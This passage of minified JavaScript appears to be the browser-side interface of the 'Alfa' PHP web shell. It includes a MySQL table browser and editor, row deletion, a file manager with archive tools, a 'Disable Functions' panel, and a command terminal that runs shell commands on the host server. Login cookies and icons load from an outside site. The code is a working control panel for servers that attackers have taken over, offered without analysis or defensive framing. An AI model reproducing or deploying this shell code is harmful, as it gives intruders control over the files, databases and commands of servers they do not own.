t=e.getAttribute("db_id"),a=(t=e.getAttribute("db_id"),d.querySelector("#"+t)),i=a.querySelector(".tables-panel-ctl");"none"==i.getAttribute("mode")?(a.querySelector(".mysql-tables").style.display="block",i.setAttribute("mode","block"),i.innerHTML="&#x3C;&#x3C;",a.querySelector(".mysql-query-results-fixed").classList.remove("mysql-query-results-fixed")):(a.querySelector(".mysql-tables").style.display="none",i.setAttribute("mode","none"),i.innerHTML="&#x3E;&#x3E;",a.querySelector(".mysql-query-results").classList.add("mysql-query-results-fixed")),i.classList.toggle("tables-panel-ctl-min")}function alfaMysqlTabCtl(e,t){var a=void 0===t?e.getAttribute("db_id"):e.db_id,i=void 0===t?e.getAttribute("target"):e.target;d.querySelectorAll("#"+a+" .mysql-query-content").forEach(function(e){e.classList.add("mysql-hide-content")}),d.querySelector("#"+a+" .mysql-query-result-tabs .mysql-query-selected-tab").classList.remove("mysql-query-selected-tab"),void 0===t?e.classList.add("mysql-query-selected-tab"):d.querySelector("#"+a+" .mysql-query-result-tabs div:nth-child("+e.child+")").classList.add("mysql-query-selected-tab"),d.querySelector("#"+a+" "+i).classList.remove("mysql-hide-content")}function alfaLoadTableData(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id");alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_load_table_data",db_info:{table:t},post:{alfa2:"load_data"}},function(e){if(0!=e.length){e=JSON.parse(e);var l="",r="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>",o="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th><th>Change</th></tr>",n="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Collation</th><th>Operator</th><th>Value</th></tr>",s=["int","smallint","bigint","tinyint","mediumint"],c=["longtext","text","mediumtext","tinytext"];for(var u in e.columns){var p="text";-1!=s.indexOf(e.columns[u].data_type)&&(p="number"),n+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+e.columns[u].collation+"</td><td><select name='"+e.columns[u].name+"'><option value='='>=</option><option value='!='>!=</option><option value='>'>&gt;</option><option value='>='>&gt;=</option><option value='<'>&lt;</option><option value='<='>&lt;=</option><option value=\"= ''\">= ''</option><option value=\"!= ''\">!= ''</option><option value='LIKE'>LIKE</option><option value='LIKE %...%'>LIKE %...%</option><option value='NOT LIKE'>NOT LIKE</option><option value='REGEXP'>REGEXP</option><option value='REGEXP ^...$'>REGEXP ^...$</option><option value='NOT REGEXP'>NOT REGEXP</option><option value='IN (...)'>IN (...)</option><option value='NOT IN (...)'>NOT IN (...)</option><option value='BETWEEN'>BETWEEN</option><option value='NOT BETWEEN'>NOT BETWEEN</option><option value='IS NULL'>IS NULL</option><option value='IS NOT NULL'>IS NOT NULL</option></select></td><td><input type='"+p+"' name='"+e.columns[u].name+"'></td></tr>";var f=alfaMysqlLoadDataType(e.columns[u].data_type);null==e.columns[u].type_value&&(e.columns[u].type_value=""),o+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td><select name='sel_"+e.columns[u].name+"'>"+f+"</select></td><td><input name='value_"+e.columns[u].name+"' type='text' value='"+(-1==c.indexOf(e.columns[u].data_type)?e.columns[u].type_value:"")+"'></td><td><button col_name='"+e.columns[u].name+"' tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlAlterTbl(this);return false;'>Change</button></td></tr>";var m="";switch(e.columns[u].data_type){case"longtext":case"text":m="<textarea name='"+e.columns[u].name+"' rows='5'></textarea>";break;case"int":case"smallint":case"bigint":m="<input type='number' name='"+e.columns[u].name+"' value=''>";break;default:m="<input type='text' name='"+e.columns[u].name+"' value=''>"}r+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+m+"</td></tr>"}if(r+="</table><div style='margin-left:20px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlUpdateRow(this, \"insert\");return false;'>Insert</button></div><div class='mysql-insert-result'></div>",o+="</table><div class='mysql-structure-qres'></div>",n+="</table><div style='padding-left: 384px;margin-top: 15px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlSearch(this);return false;'>Search</button></div>",e.pages>0){l+="<span style='cursor:pointer;' db_id='"+i+"' onclick='alfaMysqlChangePage(this,1);'><<</span> <span> page: </span> <select tbl_name='"+t+"' db_target='"+a+"' name='mysql-q-pages' db_id='"+i+"' class='db-opt-id' onchange='alfaMysqlChangePage(this);' pages='"+e.pages+"'>";for(var b=1;b<e.pages+1;b++)l+="<option>"+b+"</option>";l+="</select><span> Of "+e.pages+"</span> <span style='cursor:pointer;' db_id='"+i+"' onclick='alfaMysqlChangePage(this,2);'>>></span>"}var y=d.querySelector("#"+i);y.querySelector(".mysql-search-area").innerHTML=n,y.querySelector(".mysql-insert-row").innerHTML=r,y.querySelector(".mysql-edit-row").innerHTML="",y.querySelector(".mysql-structure").innerHTML=o,y.querySelector(".mysql-query-result-header .mysql-query-pager").innerHTML=l,y.querySelector(".mysql-query-table").innerHTML=e.status?e.table:"",alfaMysqlTabCtl({child:1,db_id:i,target:".mysql-query-result-content"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="none",alfaMysqlReportBuilder(i,e)}})}function alfaMysqlAlterTbl(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r=e.getAttribute("col_name"),o={};o.type=i.querySelector(".mysql-structure select[name=sel_"+r+"]").value,o.input=i.querySelector(".mysql-structure input[name=value_"+r+"]").value,alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_alter",db_info:{table:l,column:r,alter:o},post:{alfa2:"alter"}},function(e){var t=d.querySelector("#"+a+" .mysql-structure-qres");t.innerHTML=e,t.style.display="block"})}function alfaMysqlSearch(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r={};i.querySelectorAll(".mysql-search-area input, .mysql-search-area select").forEach(function(e){r.hasOwnProperty(e.name)||(r[e.name]={}),"SELECT"==e.tagName?r[e.name].opt=e.value:r[e.name].value=e.value}),alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_search_query",db_info:{table:l,search:r},post:{alfa2:"search"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),alfaMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function alfaMysqlEditRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=(d.querySelector("#"+i),e.getAttribute("col_key")),r=e.getAttribute("key"),o=e.getAttribute("tbl_name"),n=e.getAttribute("row_id");alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_table_edit_query",db_info:{table:o,col_key:l,key:r},post:{alfa2:t}},function(e){if(0!=e.length)if(e=JSON.parse(e),"edit"==t){var s="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>";for(var c in e){var u="";switch(e[c].type.tag){case"textarea":u="<textarea name='"+e[c].col+"' rows='5'>"+e[c].value+"</textarea>";break;case"input":u="<input type='"+e[c].type.type+"' name='"+e[c].col+"' value='"+e[c].value+"'>"}s+="<tr><th style='text-align: left;'>"+e[c].col+"</th><td>"+e[c].type.col_type+"</td><td>"+u+"</td></tr>"}s+="</table><div style='margin-left:20px;'><button col_key='"+l+"' key='"+r+"' tbl_name='"+o+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlUpdateRow(this, \"edit\");return false;'>Update</button></div><div class='mysql-update-result'></div>",d.querySelector("#"+i+" .mysql-edit-row").innerHTML=s,alfaMysqlTabCtl({child:6,db_id:i,target:".mysql-edit-row"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="inline-block"}else"delete"==t&&(e.status?d.querySelector("#"+i+" .tbl_row_l"+n).remove():alert(e.error))})}function alfaMysqlTblSelectAll(e){var t=e.getAttribute("db_id");d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(t){t.checked=e.checked})}function alfaMysqlDeleteAllSelectedrows(e){var t=e.getAttribute("db_id"),a=e.getAttribute("db_target"),i=e.getAttribute("col_key"),l=e.getAttribute("tbl_name"),r=[];if(d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&r.push(e.value)}),0==r.length)return!1;alfaMysqlApi({db_id:t,db_target:a,ajax_id:"mysql_table_delete_all_query",db_info:{table:l,col_key:i,rows:r},post:{alfa2:"delete_all"}},function(e){if(""!=e)if((e=JSON.parse(e)).status){var a=0,i=d.querySelector("#"+t);d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&(a=e.getAttribute("row_id"),i.querySelector(".tbl_row_l"+a).remove())})}else alert(e.error)})}function alfaMysqlUpdateRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=d.querySelector("#"+i),r=".mysql-insert-row",o=".mysql-insert-result",n="mysql_table_insert_query",s="insert",c={table:e.getAttribute("tbl_name")};if("edit"==t){var u=e.getAttribute("col_key"),p=e.getAttribute("key");r=".mysql-edit-row",o=".mysql-update-result",n="mysql_table_update_query",s="update",c.col_key=u,c.key=p}var f={};l.querySelectorAll(r+" input, "+r+" textarea").forEach(function(e){f.hasOwnProperty(e.name)||(f[e.name]={}),f[e.name]=e.value}),c.data=f,alfaMysqlApi({db_id:i,db_target:a,ajax_id:n,db_info:c,post:{alfa2:s}},function(e){if(0!=e.length){e=JSON.parse(e);var t=d.querySelector("#"+i+" "+o);t.style.display="block",e.status?t.innerHTML="Success...":t.innerHTML=e.error}})}function alfaMysqlLoadDataType(e){e=e.toUpperCase();var t=["INT","VARCHAR","TEXT","DATE",{key:"Numeric",vals:["TINYINT","SMALLINT","MEDIUMINT","INT","BIGINT","-","DECIMAL","FLOAT","DOUBLE","REAL","-","BIT","BOOLEAN","SERIAL"]},{key:"Date and time",vals:["DATE","DATETIME","TIMESTAMP","TIME","YEAR"]},{key:"String",vals:["CHAR","VARCHAR","-","TINYTEXT","TEXT","MEDIUMTEXT","LONGTEXT","-","BINARY","VARBINARY","-","TINYBLOB","MEDIUMBLOB","BLOB","LONGBLOB","-","ENUM","SET"]},{key:"Spatial",vals:["GEOMETRY","POINT","LINESTRING","POLYGON","MULTIPOINT","MULTILINESTRING","MULTIPOLYGON","GEOMETRYCOLLECTION"]},{key:"JSON",vals:["JSON"]}],a="",i=!1;for(var l in t)if("object"==typeof t[l]){for(var r in a+='<optgroup label="'+t[l].key+'">',t[l].vals)a+="<option"+(t[l].vals[r]!=e||i?"":" selected")+">"+t[l].vals[r]+"</option>",t[l].vals[r]==e&&(i=!0);a+="</optgroup>"}else a+="<option"+(t[l]!=e||i?"":" selected")+">"+t[l]+"</option>",t[l]==e&&(i=!0);return a}function alfaMysqlChangePage(e,t){var a=e.getAttribute("db_id"),i=0;if(void 0!==t){e=d.querySelector("#"+a+" select[name=mysql-q-pages]");var l=parseInt(e.getAttribute("pages"));if(i=parseInt(e.value),1==t?--i:++i,0==i||l<i)return!1;e.value=i}else i=e.value;var r=e.getAttribute("db_target"),o=e.getAttribute("tbl_name");alfaMysqlApi({db_id:a,db_target:r,ajax_id:"mysql_table_change_page",db_info:{table:o,page:i},post:{alfa2:"page"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function alfaRemoveCookie(e){document.cookie=e+"=;Max-Age=0; path=/;"}function alfaLogOut(){alfaRemoveCookie("AlfaUser"),alfaRemoveCookie("AlfaPass"),location.reload()}var alfaAlertBox=function(e,t){this.types={success:{class:"alert-success",icon:"http://solevisible.com/icons/menu/check-mark1.svg"},error:{class:"alert-error",icon:"http://solevisible.com/icons/menu/warning.svg"}},this.show=function(a){if(""===a||null==a)throw'"msg parameter is empty"';var i=document.querySelector(e),l=document.createElement("DIV"),r=document.createElement("DIV"),o=document.createElement("DIV"),n=document.createElement("A"),s=document.createElement("div"),c=document.createElement("IMG"),d=this;if(s.style.display="inline-block",s.style.marginRight="10px",r.style.display="inline-block",o.classList.add("alert-content"),o.innerText=a,n.classList.add("alert-close"),n.setAttribute("href","#"),l.classList.add("alert-box"),c.src=this.types[t.type].icon,c.style.width="30px",s.appendChild(c),l.appendChild(s),t.hasOwnProperty("title")){var u=document.createElement("DIV");u.classList.add("alert-content-title"),u.innerText=t.title,r.appendChild(u)}if(r.appendChild(o),l.appendChild(r),t.hideCloseButton&&void 0!==t.hideCloseButton||l.appendChild(n),t.hasOwnProperty("type")&&l.classList.add(this.types[t.type].class),i.appendChild(l),n.addEventListener("click",function(e){e.preventDefault(),d.hide(l)}),!t.persistent)var p=setTimeout(function(){d.hide(l),clearTimeout(p)},t.closeTime)},this.hide=function(e){e.classList.add("hide");var t=setTimeout(function(){e.parentNode.removeChild(e),clearTimeout(t)},500)}};function alfaShowNotification(e,t,a,i,l){void 0===a&&(a="success"),void 0===i&&(i=!1),void 0===l&&(l=1e4);var r={closeTime:l,persistent:i,type:a,hideCloseButton:!1};void 0!==t&&(r.title=t),new alfaAlertBox("#alert-area",r).show(e)}function alfaSyncMenuToOpt(e,t){var a="",i="",l=null;void 0!==t?(a="view_archive",i=e,l=location):(a=e.name,i=e.getAttribute("fname"),l=e),"extract"==a?(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=deziper",g("deziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="DeCompressor"):"compress"==a?(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=ziper",g("ziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="Compressor"):"view_archive"==a&&(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=archive_manager",g("archive_manager",null,"",c_+"/"+i,""),d.querySelector(".opt-title").innerHTML="Archive Manager")}function doFilterName(e){var t="#filesman_holder_"+alfa_current_fm_id;setTimeout(function(){var a=new RegExp(e.value,"i");d.querySelectorAll(t+" .fmanager-row").forEach(function(e){-1==e.querySelector(".main_name").getAttribute("fname").search(a)?e.style.display="none":e.style.display="table-row"})},100)}function sortBySelectedValue(e,t){setCookie(t,e.options[e.selectedIndex].value,2012),g("FilesMan",c_)}function loadPopUpDatabase(e,t,a){if(console.log(t),$("database_window").style.display="block",void 0===t){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}try{d.querySelector(".sql-tabs .sql-newtab").remove()}catch(e){}var i="id_db_"+getRandom(10);d.querySelector("#database_window .content_options_holder .sql-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="sql-content sql-active-content">'+e+"</div>"),d.querySelector("#database_window .content_options_holder .sql-tabs").insertAdjacentHTML("beforeend",'<div id="tab_'+i+'" opt_id="'+i+'" class="sql-tabname sql-active-tab" onclick="dbTabController(this);"><span style="font-weight:unset;">New DB Connection</span> <img opt_id="'+i+'" onclick="closeDatabase(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div><div class="sql-newtab" onclick="alfa_can_add_opt=true;g(\'sql\',null,\'\',\'\',\'\');" style="background-color:#800000;"><span style="font-weight:unset;">New Tab +</span></div>'),$(i).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",i)});try{$(i).querySelector(".getconfig").setAttribute("base_id",i)}catch(e){}return i}$(t).innerHTML=e;var l=$("tab_"+t);null!=l&&((-1==l.classList.value.indexOf("sql-active-tab")||database_window_is_minimized)&&(l.classList.add("tab-is-done"),alfaShowNotification("proccess is done...","DB: "+l.innerText)),database_window_is_minimized&&alfaUpdateOptionsBadge("database_window")),void 0!==mysql_cache[t]&&mysql_cache[t].hasOwnProperty("db")&&mysql_cache[t].db.length>0&&"update"!=a&&(d.querySelector("#tab_"+t+">span").innerHTML=mysql_cache[t].db),$(t).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",t)});try{$(t).querySelector(".getconfig").setAttribute("base_id",t)}catch(e){}database_window_is_minimized||(d.body.style.overflow="hidden")}function loadPopUpOpTions(e,t){console.log(e),alfa_before_do_action_id="",$("options_window").style.display="block";var a=$("option_"+e);if(alfa_can_add_opt){alfa_can_add_opt=!1;try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var i="",l=$("menu_opt_"+e).innerHTML;"market"==e?l="Alfa Market":"GetDisFunc"==e&&(l="Disable Functions");try{d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}if(null!=a){var r=a.getAttribute("opt_count");null!=r?(i=parseInt(r)+1,a.setAttribute("opt_count",i)):(i=1,a.setAttribute("opt_count",i))}var o="option_"+e+i;d.querySelector("#options_window .content_options_holder .options_content").insertAdjacentHTML("afterbegin",'<div id="'+o+'" class="options_holder">'+t+"</div>"),d.querySelector("#options_window .content_options_holder .options_tab").insertAdjacentHTML("beforeend",'<div opt_id="'+o+'" onclick="optionsTabController(this);" title="'+l+'" id="tab_'+o+'" class="tab_name tab_is_active">'+l+' <img opt_id="'+o+'" onclick="closeOption(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),$(o).classList.toggle("option_is_active"),d.querySelectorAll("#"+o+" form, #"+o+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var l=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'alfaBeforeDoAction("'+e+i+'");'+l),t.setAttribute("opt_id",e+i)}else{l=t.getAttribute("onclick");t.setAttribute("onclick",'alfaBeforeDoAction("'+e+i+'");'+l)}});try{$(o).querySelector(".getconfig").setAttribute("base_id",e+i)}catch(e){}return e+i}a.innerHTML=t;var n=$("tab_option_"+e);null!=n&&((-1==n.classList.value.indexOf("tab_is_active")||options_window_is_minimized)&&(n.classList.add("tab-is-done"),alfaShowNotification("proccess is done...",n.innerText)),options_window_is_minimized&&alfaUpdateOptionsBadge("options_window")),d.querySelectorAll("#option_"+e+" form, #option_"+e+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var i=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'alfaBeforeDoAction("'+e+'");'+i),t.setAttribute("opt_id",e)}else{i=t.getAttribute("onclick");t.setAttribute("onclick",'alfaBeforeDoAction("'+e+'");'+i)}});try{a.querySelector(".getconfig").setAttribute("base_id",e)}catch(e){}options_window_is_minimized||(d.body.style.overflow="hidden")}function alfaBeforeDoAction(e){alfa_before_do_action_id=e}function alfaLoaderOnTop(e){$("a_loader").style.display=e,d.body.style.overflow="block"==e?"hidden":"visible"}function alfaAjaxController(e){var t=e.getAttribute("parent");$("loader_"+t).remove(),"filesman_holder"==t.substr(0,15)&&($(t).style.minHeight="0"),_ALFA_AJAX_.hasOwnProperty(t)&&_ALFA_AJAX_[t].abort()}function closeDatabase(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("sql-active-tab"))if((e=d.querySelectorAll(".sql-tabs .sql-tabname")).length>1){e[0].classList.add("sql-active-tab");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("sql-active-content")}else editorClose("database_window");d.querySelector("div[opt_id="+a+"]").remove()}function closeFmTab(e,t){t.stopPropagation();var a=e.getAttribute("fm_id"),i=$("filesman_tab_"+a);if(-1!=i.classList.value.indexOf("filesman-tab-active")&&(e=d.querySelectorAll("#filesman_tabs .filesman_tab")).length>1){e[0].classList.add("filesman-tab-active");var l=e[0].getAttribute("fm_id"),r="filesman_holder_"+l;if(null!=$(r)){$(r).classList.toggle("filesman-active-content");var o=$("filesman_tab_"+l).getAttribute("path");initDir(o),d.mf.c.value=o,alfa_current_fm_id=l}}i.remove(),$("filesman_holder_"+a).remove(),alfaFilesmanTabHideTitle()}function closeOption(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("tab_is_active"))if((e=d.querySelectorAll(".options_tab .tab_name")).length>1){e[0].classList.add("tab_is_active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("option_is_active")}else editorClose("options_window");d.querySelector("div[opt_id="+a+"]").remove()}function historyPanelController(e){"hidden"==e.getAttribute("mode")?(d.querySelector(".editor-explorer").style.display="block",d.querySelector(".editor-modal").style.marginLeft="20%",e.setAttribute("mode","visible"),e.style.left="19%",e.innerHTML="<<"):(d.querySelector(".editor-explorer").style.display="none",d.querySelector(".editor-modal").style.marginLeft="1%",e.setAttribute("mode","hidden"),e.style.left="0%",e.innerHTML=">>")}function closeTerminalContent(e,t){t.stopPropagation();var a=e.getAttribute("term_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("active-terminal-tab"))&&(e=d.querySelectorAll(".terminal-tabs .terminal-tab")).length>1){e[0].classList.add("active-terminal-tab");var i=e[0].getAttribute("term_id");null!=$(i)&&$(i).classList.toggle("active-terminal-content")}d.querySelector("div[term_id="+a+"]").remove()}function closeEditorContent(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("editor-tab-active"))&&(e=d.querySelectorAll(".editor-tabs .editor-tab-name")).length>1){e[0].classList.add("editor-tab-active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("editor-content-active")}d.querySelector("div[opt_id="+a+"]").remove()}function optionsTabController(e){try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("option_is_active");try{d.querySelector("#options_window .content_options_holder .options_tab \t.tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("tab_is_active"),d.querySelector(".opt-title").innerHTML=e.getAttribute("title"),alfaUpdateOptionsBadge("options_window")}function terminalTabController(e){try{d.querySelector(".terminal-tab.active-terminal-tab").classList.remove("active-terminal-tab")}catch(e){}try{d.querySelector(".terminal-content.active-terminal-content").classList.remove("active-terminal-content")}catch(e){}var t=e.getAttribute("term_id");if(null==t)return!1;$(t).classList.toggle("active-terminal-content"),e.classList.remove("tab-is-done"),e.classList.add("active-terminal-tab"),$(t).querySelector(".php-terminal-input").focus(),alfaUpdateOptionsBadge("cgiloader")}function filesmanTabController(e){try{d.querySelector(".ajaxarea.filesman-active-content").classList.remove("filesman-active-content")}catch(e){}try{d.querySelector(".filesman_tab.filesman-tab-active").classList.remove("filesman-tab-active")}catch(e){}var t=e.getAttribute("fm_id");if(null==t)return!1;alfa_current_fm_id=t,e.classList.add("filesman-tab-active"),e.classList.remove("tab-is-done"),$("filesman_holder_"+t).classList.toggle("filesman-active-content");var a=e.getAttribute("path");initDir(a),d.mf.c.value=a}function dbTabController(e){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("sql-active-content"),e.classList.remove("tab-is-done"),e.classList.add("sql-active-tab"),alfaUpdateOptionsBadge("database_window")}function editorTabController(e,t){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}var a=null;void 0===t?a=e.getAttribute("opt_id"):(a=e,e=$("tab_"+a));var i=editor_files["file_"+a.replace("editor_source_","")];if(void 0!==i&&(d.querySelector(".editor-path").innerHTML=(i.pwd+"/"+i.file).replace(/\/\//g,"/")),null==a)return!1;$(a).classList.toggle("editor-content-active");try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("editor-tab-active"),alfaUpdateOptionsBadge("editor")}function alfaUpdateOptionsBadge(e){var t=d.querySelector("#"+e+"-minimized .options_min_badge");if(null!=t){var a=d.querySelectorAll("#"+e+" .tab-is-done").length;t.innerHTML=a,t.style.visibility=a>0?"visible":"hidden"}}function alfaOpenPhpTerminal(e){if(php_temrinal_using_cgi&&void 0===e)showEditor("cgiloader");else{$("cgiloader").style.display="block",$("cgiloader").style.background="rgba(0, 0, 0, 0.57)",$("cgiframe").style.background="rgba(0, 0, 0, 0.81)",$("cgiframe").style.border="1px solid rgb(30, 86, 115)",$("cgiframe").style.height="90%",$("cgiframe").style.padding="3px",d.querySelector("#cgiloader .opt-title").innerHTML="Terminal";var t="",a="",i="terminal_id_"+getRandom(10);void 0===e&&(t=" active-terminal-content",a=" active-terminal-tab"),d.querySelector("#cgiframe .terminal-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="terminal-content'+t+'"><div class="php-terminal-output"><div><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+'\',1);">+</button><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+"',0);\">-</button><input onchange=\"alfaTerminalChangecolor(this,'"+i+'\');" style="height: 18px;background: #dde2e2;" type="color"></div><pre class="ml1" style="border:unset;height: 90%;"></pre></div><div><form term_id="'+i+'" onSubmit="alfaExecTerminal(this);this.c.value=\'\';return false;" autocomplete="off" style="margin-top: 10px;"><div style="overflow: auto;white-space: nowrap;"><div style="display: inline-block;color:#4fbec3;margin-bottom:5px;margin-right:5px;">CWD:~# </div><div style="display: inline-block;color:#42ec42;" class="php-terminal-current-dir"></div></div><div style="position:relative;"><span style="color: #00ff08;font-size: 25px;">$ </span><input style="padding: 8px;font-size: 20px;width: 67%;border: 1px solid #27979B;padding-right:35px;" onkeyup="alfaWalkInTerminalHistory(this,event,\''+i+'\');" term_id="'+i+'" class="php-terminal-input" type="text" name="c" onfocus="closeHistoryCmd(\'free\',this);" placeholder="ls -la"><button class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;">ExeCute<button term_id="'+i+'" class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;" onClick="alfaExecTerminal(this, 1);return false;">Current Dir</button><div class="cmd-history-holder"><div class="commands-history-header">History</div><span onClick="clearTerminalHistory();" style="border-bottom: 1px solid;margin-bottom: 5px;display: inline-block;padding: 5px;color: #59de69;cursor: pointer;">Clear history</span><div style="overflow: auto;height: 82%;" class="commands-history"></div></div><div term_id="'+i+'" class="cmd-history-icon" mode="" onclick="closeHistoryCmd(this);"><img style="width:27px;" src="http://solevisible.com/icons/menu/time2.svg"></div></form></div></div></div>');try{$("terminal_new_tab").remove()}catch(e){}d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="terminalTabController(this);" term_id="'+i+'" id="tab_'+i+'" class="terminal-tab'+a+'">Terminal <img term_id="'+i+'" onclick="closeTerminalContent(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="alfaOpenPhpTerminal(true);" id="terminal_new_tab" style="background-color:#800000;" class="terminal-tab">New Tab +</div>'),terminal_walk_index[i]={index:0,key:-1},d.querySelector("#"+i+" .php-terminal-input").focus(),d.querySelector("#"+i+" .php-terminal-current-dir").innerHTML=c_,d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Terminal",alfaTerminalSetColorAndSize(i),php_temrinal_using_cgi=!0;var l=alfaGetTerminalHistory();for(var r in l)d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+l[r]+"</div>")}d.body.style.overflow="hidden"}function alfaTerminalSetColorAndSize(e){var t=getCookie("alfa-terminal-color"),a=getCookie("alfa-terminal-fontsize");void 0!==t&&(d.querySelector("#"+e+" pre.ml1").style.color=t),void 0!==a&&(d.querySelector("#"+e+" pre.ml1").style.fontSize=a)}function alfaTerminalChangecolor(e,t){d.querySelector("#"+t+" pre.ml1").style.color=e.value,setCookie("alfa-terminal-color",e.value,2012)}function alfaGetTerminalHistory(e){var t=getCookie("alfa-terminal-history");try{t=atob(t),t=JSON.parse(t)}catch(e){t=[]}return void 0!==e&&t.reverse(),t}function changeTerminalFontSize(e,t){var a=d.querySelector("#"+e+" pre.ml1"),i=parseInt(window.getComputedStyle(a,null).getPropertyValue("font-size")),l="";1==t?(l=i+1+"px",a.style.fontSize=l):(l=i-1+"px",a.style.fontSize=l),setCookie("alfa-terminal-fontsize",l,2012)}function alfaWalkInTerminalHistory(e,t,a){var i=t||window.event;if("38"==i.keyCode||"40"==i.keyCode||"37"==i.keyCode||"39"==i.keyCode)switch(i.keyCode){case 38:var l=alfaGetTerminalHistory(!0),r="";0==terminal_walk_index[a].index?(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,void 